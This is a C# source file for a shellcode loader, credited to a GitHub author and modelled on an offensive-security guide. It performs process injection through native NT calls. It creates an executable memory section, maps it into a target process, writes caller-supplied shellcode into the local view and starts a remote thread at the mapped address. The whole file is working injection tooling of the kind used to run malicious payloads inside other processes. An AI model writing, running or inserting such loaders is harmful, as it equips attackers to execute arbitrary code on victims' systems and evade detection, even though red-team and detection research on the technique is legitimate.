using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static ShellCodeLoader.Shared;
/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Please let this credit for all the time I worked on ||
|| Guide & Inspirations : https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection
 */
namespace ShellCodeLoader
{
    public class MapView : IDisposable
    {
        private byte[] ShellCode;
        private uint RegionSize;
        private Process Target;
        public MapView(Process target, byte[] shellCode) 
        {
            this.ShellCode = shellCode;
            this.RegionSize = (uint)shellCode.Length;
            this.Target = target;
        }

        public MapView(byte[] shellCode)
        {
            this.ShellCode = shellCode;
            this.RegionSize = (uint)shellCode.Length;
            this.Target = Process.GetCurrentProcess();
        }

        public void LoadWithNtMapView()
        {
            NtMapView();
        }

        private void NtMapView() 
        {
            IntPtr hSectionHandle = IntPtr.Zero;
            Imports.NtCreateSection(ref hSectionHandle, Imports.SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref RegionSize, PageProtection.PAGE_EXECUTE_READWRITE, Imports.MappingAttributes.SEC_COMMIT, IntPtr.Zero);


            IntPtr pLocalView = IntPtr.Zero;
            UInt64 localOffset = 0;
            Imports.NtMapViewOfSection(hSectionHandle, Process.GetCurrentProcess().Handle, ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref localOffset, ref RegionSize, Imports.VIEWUNMAP, 0, PageProtection.PAGE_READWRITE);

            UInt64 remoteOffset = 0;
            IntPtr pRemoteView = IntPtr.Zero;
            Imports.NtMapViewOfSection(hSectionHandle, Target.Handle, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref remoteOffset, ref RegionSize, Imports.VIEWUNMAP, 0, PageProtection.PAGE_EXECUTE_READ);


            UIntPtr bytesWritten;
            Imports.NtWriteVirtualMemory(Process.GetCurrentProcess().Handle, pLocalView, ShellCode, (UIntPtr)RegionSize, out bytesWritten);


            IntPtr hThread = IntPtr.Zero;
            Imports.NtCreateThreadEx(ref hThread, AccessMask.GENERIC_EXECUTE, IntPtr.Zero, Target.Handle, pRemoteView, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        }

        private static class Imports
        { 
            internal const String KERNEL32 = "kernel32.dll";
            internal const String NTDLL = "ntdll.dll";
            internal const UInt32 VIEWUNMAP = 0x2;


            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtCreateSection(ref IntPtr SectionHandle, SectionAccess DesiredAccess, IntPtr ObjectAttributes, ref uint MaximumSize, PageProtection SectionPageProtection, MappingAttributes AllocationAttributes, IntPtr FileHandle);

            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref UInt64 SectionOffset, ref uint ViewSize, uint InheritDisposition, UInt32 AllocationType, PageProtection Win32Protect);
           
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UIntPtr bufferSize, out UIntPtr written);

            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtCreateThreadEx(ref IntPtr threadHandle, AccessMask desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);


            [Flags]
            public enum SectionAccess : uint
            {
                SECTION_EXTEND_SIZE = 0x0010,
                SECTION_QUERY = 0x0001,
                SECTION_MAP_WRITE = 0x0002,
                SECTION_MAP_READ = 0x0004,
                SECTION_MAP_EXECUTE = 0x0008,
                SECTION_ALL_ACCESS = 0xe
            }

            [Flags]
            public enum MappingAttributes : uint
            {
                SEC_COMMIT = 0x8000000,
                SEC_IMAGE = 0x1000000,
                SEC_IMAGE_NO_EXECUTE = 0x11000000,
                SEC_LARGE_PAGES = 0x80000000,
                SEC_NOCACHE = 0x10000000,
                SEC_RESERVE = 0x4000000,
                SEC_WRITECOMBINE = 0x40000000
            }
        }

        private bool _disposed = false;

        // Instantiate a SafeHandle instance.
        private SafeHandle _safeHandle = new SafeFileHandle(IntPtr.Zero, true);

        // Public implementation of Dispose pattern callable by consumers.
        public void Dispose() => Dispose(true);

        // Protected implementation of Dispose pattern.
        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
            {
                return;
            }

            if (disposing)
            {
                // Dispose managed state (managed objects).
                _safeHandle?.Dispose();
            }

            _disposed = true;
            GC.SuppressFinalize(this);
        }
    }
}
